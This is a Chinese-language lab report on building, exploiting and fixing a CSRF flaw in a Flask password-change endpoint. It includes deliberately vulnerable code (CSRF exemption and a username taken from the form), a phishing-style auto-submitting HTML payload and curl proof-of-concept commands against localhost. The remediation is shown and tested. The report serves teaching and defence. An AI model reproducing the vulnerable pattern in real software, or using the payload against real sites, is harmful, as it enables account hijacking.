# CSRF 漏洞测试与修复实验报告

> **实验环境**: Kali Linux / Python 3.13 / Flask + SQLite  
> **实验日期**: 2026-07-21  
> **测试目标**: http://127.0.0.1:5000/change-password  
> **代码仓库**: https://github.com/Perry88882/Summer-Training-Project  
> **作者**: Perry

---

## 一、功能设计与构建

### 1.1 需求背景

本系统此前已具备登录认证、用户注册、信息搜索、头像上传、个人中心、余额充值和动态页面加载七个功能模块。用户在个人中心页面可以看到自己的 ID、用户名、邮箱、手机和余额信息，但缺少对账户安全至关重要的**密码修改功能**。如果用户想要更新密码，唯一的途径是重新注册一个新账号——这显然不合理。

因此，我们在个人中心页面上新增了一个密码修改区域，允许已登录用户设置新密码。密码修改后以 PBKDF2 或 scrypt 哈希形式存储，与用户注册时保持一致。

### 1.2 漏洞版本的设计思路和代码实现

按照需求规格，密码修改功能的实现非常直接：从表单接收 `username` 和 `new_password` 参数，然后更新数据库中对应的密码字段。为了"简化开发"，我们做了几个关键设计决策，事后证明每一个都是安全隐患：

```python
@app.route("/change-password", methods=["POST"])
@csrf.exempt                          # ← 决策1：豁免 CSRF 校验
def change_password() -> str:
    """修改密码 —— 不验证原密码，不校验 user_id 归属"""
    username = request.form.get("username", "")      # ← 决策2：从表单获取目标用户名
    new_password = request.form.get("new_password", "")
    confirm_password = request.form.get("confirm_password", "")

    if not username or not new_password:
        return error("用户名和新密码不能为空")
    if new_password != confirm_password:
        return error("两次输入的密码不一致")
    if len(new_password) < 6:
        return error("密码长度不能少于 6 位")

    password_hash = generate_password_hash(new_password)
    conn.execute("UPDATE users SET password = ? WHERE username = ?",
                 (password_hash, username))          # ← 决策3：任何已登录用户可改任何人
    conn.commit()
    return redirect(url_for("profile"))
```

前端表单的核心问题是使用了一个隐藏的 `<input name="username">` 来传递要修改的目标用户：

```html
<form method="POST" action="/change-password">
    <input type="hidden" name="username" value="{{ profile_user.username }}">
    <!-- ↑ 攻击者可以在恶意页面中伪造这个隐藏字段 -->
    <input name="new_password" placeholder="新密码">
    <input name="confirm_password" placeholder="确认密码">
    <button type="submit">修改密码</button>
</form>
```

表面上看，这个表单似乎没问题——它显示在当前用户的个人中心页面，username 隐藏字段也自动填充为当前用户的用户名。但关键在于**整个表单没有 CSRF token**。CSRF 攻击的核心原理正是利用浏览器在跨站请求中自动携带 Cookie 的行为，在受害者不知情的情况下，以受害者的身份向目标站点发送恶意请求。

---

## 二、漏洞原理分析

### 2.1 CSRF（跨站请求伪造）的核心机制

CSRF（Cross-Site Request Forgery，跨站请求伪造）是一种迫使已登录用户在不知情的情况下执行非本意操作的攻击方式。它利用的是 Web 应用对浏览器请求的天然信任——只要请求携带了有效的 Session Cookie，服务器就认为是用户本人发起的合法操作。

攻击的完整流程如下：

```
第一步：受害者 alice 在浏览器中登录了 http://127.0.0.1:5000
        → 浏览器保存了 alice 的 session cookie

第二步：攻击者诱导 alice 访问恶意网站（或点击邮件中的链接）
        → 恶意网站包含如下 HTML:
        <form action="http://127.0.0.1:5000/change-password" method="POST">
          <input name="username" value="alice">
          <input name="new_password" value="hacker666">
          <input name="confirm_password" value="hacker666">
        </form>
        <script>document.forms[0].submit();</script>

第三步：alice 的浏览器加载恶意页面，JavaScript 自动提交表单
        → 浏览器向 http://127.0.0.1:5000/change-password 发起 POST
        → 浏览器自动携带了 alice 的 session cookie！
        → 服务器收到请求：有有效 session（合法用户），执行修改密码操作
        → alice 的密码被改为 hacker666

第四步：alice 毫不知情，以为银行/电商页面加载完了而已
        → 攻击者用 hacker666 登录 alice 的账户 → 账户完全被控制
```

CSRF 攻击之所以能够成功，依赖于以下三个条件的**同时成立**：

1. **受害者已在目标站点登录**（浏览器保存了有效的 session cookie）
2. **目标站点的操作通过简单的表单参数即可触发**（不需要特殊 header、不需要 JavaScript 交互）
3. **目标站点的操作不验证请求来源**（没有 CSRF token、不检查 Origin/Referer header）

### 2.2 本系统中的 CSRF 漏洞分析

回到我们的 `/change-password` 路由，它完美满足了 CSRF 攻击的所有三个条件：

| 条件 | 本系统状态 | 说明 |
|------|----------|------|
| 用户已登录 | ✅ | 受害者 alice 的浏览器保存着有效的 Flask session cookie |
| 操作简单 | ✅ | 修改密码只需要 POST 三个表单参数：username、new_password、confirm_password |
| 无来源验证 | ✅ | `@csrf.exempt` 明确豁免了 CSRF 校验，不检查 Origin/Referer，不要求 CSRF token |

**攻击者可以构造的恶意 HTML 页面**：

```html
<html>
<body>
  <h1>恭喜中奖！点击领取 iPhone 15</h1>
  <p>正在跳转到领奖页面...</p>

  <!-- 受害者看不见的隐藏表单，页面加载后自动提交 -->
  <form id="evil" action="http://127.0.0.1:5000/change-password" method="POST">
    <input type="hidden" name="username" value="alice">
    <input type="hidden" name="new_password" value="hackerOwnedYou666">
    <input type="hidden" name="confirm_password" value="hackerOwnedYou666">
  </form>

  <script>
    // 页面加载后立即自动提交
    document.getElementById("evil").submit();
  </script>
</body>
</html>
```

受害者 alice 看到的是"中奖页面"，后台却已悄然完成了密码修改。

### 2.3 为什么 `@csrf.exempt` 是问题根源

Flask-WTF 的 `@csrf.exempt` 装饰器的作用是告诉 Flask-WTF 框架"这个路由不需要 CSRF 保护"。一旦使用该装饰器，框架就不会在 POST 请求到达时检查 CSRF token。这意味着：

- 任何网站都可以向这个 URL 发起 POST 请求（不存在同源策略对表单提交的限制）
- 浏览器会自动携带受害者登录时的 session cookie
- 服务器端只验证了 cookie 的有效性（用户确实已登录），但无法区分这个请求是用户主动发起还是被恶意诱导的

---

## 三、CSRF 漏洞测试过程与结果

### 3.1 测试环境准备

```bash
# 启动漏洞版本的应用
cd /opt/Class01
python3 app.py &

# 确认服务正常
curl -s -o /dev/null -w "HTTP: %{http_code}\n" http://127.0.0.1:5000/

# 受害者 alice 登录
CSRF=$(curl -s http://127.0.0.1:5000/login -c /tmp/alice.txt | grep -oP 'name="csrf_token" value="\K[^"]+')
curl -s http://127.0.0.1:5000/login -X POST \
  -d "csrf_token=$CSRF&username=alice&password=Alice@2025#Secure" \
  -b /tmp/alice.txt -c /tmp/alice.txt -o /dev/null -w "Login: %{http_code}\n"
```

### 3.2 POC — CSRF 攻击篡改密码

**第一步：记录攻击前 alice 的密码状态**

```bash
sqlite3 data/users.db "SELECT username, password FROM users WHERE username='alice'"
# 输出: alice|alice2025
```

**第二步：模拟攻击者构造的恶意页面自动提交**

攻击者发布一个钓鱼页面，其中包含隐藏的自动提交表单。我们通过 curl 模拟浏览器行为——携带 alice 的 session cookie 发送修改密码请求，但不附带 CSRF token：

```bash
curl -s http://127.0.0.1:5000/change-password -X POST \
  -d "username=alice&new_password=csrfPwned666&confirm_password=csrfPwned666" \
  -b /tmp/alice.txt \
  -o /dev/null -w "HTTP %{http_code}\n"
```

**实际结果**：HTTP 302（请求被成功处理，重定向到个人中心）

**第三步：确认密码已被篡改**

```bash
sqlite3 data/users.db "SELECT username, substr(password,1,50) FROM users WHERE username='alice'"
# 攻击前: alice|alice2025
# 攻击后: alice|scrypt:32768:8:1$7OlKmCeNRGflLaGD$21086b...  ← 密码已变为哈希！
```

**第四步：验证攻击者设置的新密码可以登录**

```bash
CSRF=$(curl -s http://127.0.0.1:5000/login -c /tmp/v.txt | grep -oP 'name="csrf_token" value="\K[^"]+')
curl -s http://127.0.0.1:5000/login -X POST \
  -d "csrf_token=$CSRF&username=alice&password=csrfPwned666" \
  -b /tmp/v.txt -o /dev/null -w "HTTP: %{http_code}\n"
# 输出: HTTP: 302 → 攻击者密码登录成功
```

**第五步：验证受害者原密码已失效**

```bash
curl -s http://127.0.0.1:5000/login -X POST \
  -d "csrf_token=$CSRF&username=alice&password=Alice@2025#Secure" \
  -b /tmp/v.txt -o /dev/null -w "HTTP: %{http_code}\n"
# 输出: HTTP: 200 → "用户名或密码错误"（原密码失效）
```

### 3.3 测试结果总结

| 步骤 | 操作 | 结果 |
|------|------|------|
| 1 | 确认 alice 原密码 | `alice2025`（明文弱密码） |
| 2 | CSRF 攻击（无 CSRF token） | HTTP 302 — **密码被成功修改** |
| 3 | 确认密码已变 | `alice2025` → `scrypt:32768:8:1$...`（已被篡改为新哈希） |
| 4 | 攻击者新密码登录 | HTTP 302 — **登录成功** |
| 5 | 受害者原密码登录 | HTTP 200 — "用户名或密码错误"（账户被劫持） |

> ✅ **漏洞确认**：在零交互的情况下，受害者的密码被远程篡改。攻击者完全控制了受害者账户。

---

## 四、修复过程

### 4.1 修复策略

CSRF 漏洞的修复需要从**两个层面**同时入手：

| 层面 | 修复内容 | 原理 |
|------|---------|------|
| **后端** | 移除 `@csrf.exempt`，启用 Flask-WTF 的 CSRF 中间件校验 | 所有 POST 请求必须携带有效的 CSRF token |
| **前端** | 在密码修改表单中添加 `{{ csrf_token() }}` 隐藏字段 | 确保合法用户的操作能通过 CSRF 校验 |

此外，我们还顺便修复了之前遗留的**越权修改密码**漏洞——将 `username` 的数据源从客户端表单改为服务器端 session：

| 修复 | 修复前 | 修复后 |
|------|--------|--------|
| username 来源 | `request.form.get("username")` | `session["username"]` |
| 越权风险 | alice 可修改 admin 密码 | 任何人只能修改自己的密码 |

### 4.2 后端修复

```python
# ❌ 漏洞版本
@app.route("/change-password", methods=["POST"])
@csrf.exempt                                    # ← CSRF 豁免，任意来源可调用
def change_password():
    username = request.form.get("username")      # ← 从表单获取，可伪造
    # ...修改密码...
    conn.execute("UPDATE users SET password = ? WHERE username = ?",
                 (password_hash, username))

# ✅ 安全版本
@app.route("/change-password", methods=["POST"])
# 移除 @csrf.exempt，Flask-WTF 自动要求 CSRF token
def change_password():
    if not session.get("username"):              # 必须登录
        return redirect(url_for("login"))
    username = session["username"]               # ← 从 session 获取，不可伪造
    # ...修改密码...
    conn.execute("UPDATE users SET password = ? WHERE username = ?",
                 (password_hash, username))       # ← 只能改自己的
```

### 4.3 前端修复

```html
<!-- ❌ 漏洞版本 -->
<form method="POST" action="/change-password">
    <input type="hidden" name="username" value="{{ profile_user.username }}">
    <!-- 没有 CSRF token -->
    <input name="new_password">
    <button>修改密码</button>
</form>

<!-- ✅ 安全版本 -->
<form method="POST" action="/change-password">
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
    <!-- 不再需要 username 隐藏字段 -->
    <input name="new_password">
    <button>修改密码</button>
</form>
```

### 4.4 修复原理——CSRF token 为什么有效？

Flask-WTF 的 CSRF 保护机制工作流程如下：

```
1. 用户 GET /profile 请求时
   → Flask-WTF 生成一个随机 CSRF token（例如 32 字节随机字符串）
   → token 存入用户的 session 中
   → token 渲染到表单的隐藏字段: <input name="csrf_token" value="...">

2. 用户 POST /change-password 时
   → 表单提交同时发送了 session cookie（含 CSRF token）
   → Flask-WTF 比较：session 中的 token == 表单中的 token
   → 如果匹配 → 请求合法，允许继续
   → 如果不匹配或缺失 → 返回 400 Bad Request

3. 攻击者的恶意表单
   → 攻击者无法知道 alice 浏览器中的 CSRF token 值
   → 攻击者的表单没有有效的 token
   → 服务器校验失败 → 400 → 密码未被修改
```

**关键要点**：CSRF token 存在用户 session 中，而 session 是由 httpOnly cookie 保护的——JavaScript 无法读取它。攻击者即使知道表单的所有字段名和值，也无法构造出有效的 CSRF token，因为每个用户的 token 是随机的、独立的，且不与其他网站共享。

---

## 五、修复结果验证

### 5.1 CSRF 攻击回归测试

| 测试 | 操作 | 修复前 | 修复后 |
|------|------|--------|--------|
| CSRF 攻击 | POST `/change-password` 无 token | ✅ 密码被篡改 | ❌ **HTTP 400 — 拦截** |
| 合法修改 | POST `/change-password` 带 token | ✅ 成功 | ✅ **HTTP 302 — 成功** |
| 攻击者密码 | 用攻击者设置的密码登录 | ✅ 成功 | — |（无需测试，攻击未生效） |
| 受害者原密码 | 用原密码登录 | ❌ 失效 | ✅ **正常** |

### 5.2 命令行验证

```bash
# CSRF 攻击（无 CSRF token）—— 应返回 400
curl -s http://127.0.0.1:5000/change-password -X POST \
  -d "username=alice&new_password=hack123&confirm_password=hack123" \
  -b session_cookie -o /dev/null -w "%{http_code}\n"
# → 400 ✅ 攻击被拦截

# 合法修改（带 CSRF token）—— 应返回 302
CSRF_TOKEN=$(curl -s http://127.0.0.1:5000/profile -b session_cookie \
  | grep -oP 'name="csrf_token" value="\K[^"]+')
curl -s http://127.0.0.1:5000/change-password -X POST \
  -d "csrf_token=$CSRF_TOKEN&new_password=safe123&confirm_password=safe123" \
  -b session_cookie -o /dev/null -w "%{http_code}\n"
# → 302 ✅ 正常功能保留
```

### 5.3 越权修复验证

| 测试 | 修复前 | 修复后 |
|------|--------|--------|
| alice 改 admin 密码 | ✅ 成功 | ❌ **只能改自己** |

---

## 六、完整修复清单

| # | 修复项 | 修复前 | 修复后 | 文件 |
|---|-------|--------|--------|------|
| 1 | CSRF 豁免 | `@csrf.exempt` | 移除装饰器 | `app.py` |
| 2 | 用户名来源 | `request.form.get("username")` | `session["username"]` | `app.py` |
| 3 | 登录验证 | 无 | `if not session.get("username")` | `app.py` |
| 4 | CSRF token 前端 | 无 | `{{ csrf_token() }}` | `profile.html` |
| 5 | 隐藏 username 字段 | `profile_user.username` | 移除 | `profile.html` |

---

## 七、安全设计原则总结

1. **CSRF token 是防止跨站请求伪造的标准防线**。任何能改变用户状态的 POST 请求（修改密码、转账、删除数据等）都必须要求 CSRF token

2. **不要因为开发方便而豁免安全机制**。`@csrf.exempt` 就像把家门锁拆掉——表面上进出更方便了，实际上给了所有人进出的权利

3. **服务端永远不要信任客户端提交的身份标识**（CWE-639）。`request.form.get("username")` 看似无害，但恶意用户可以在表单中填入任何人的用户名

4. **从 session 推导用户身份是唯一安全的方式**。`session["username"]` 由服务端在登录时写入，不能被客户端伪造

5. **浏览器自动携带 Cookie 是 CSRF 存在的根本原因**，也是 CSRF token 能够防御的原理所在——攻击者无法读取他域的 session cookie，因此也无法构造出有效的 token

---

*GitHub: https://github.com/Perry88882/Summer-Training-Project*  
*日期: 2026-07-21*
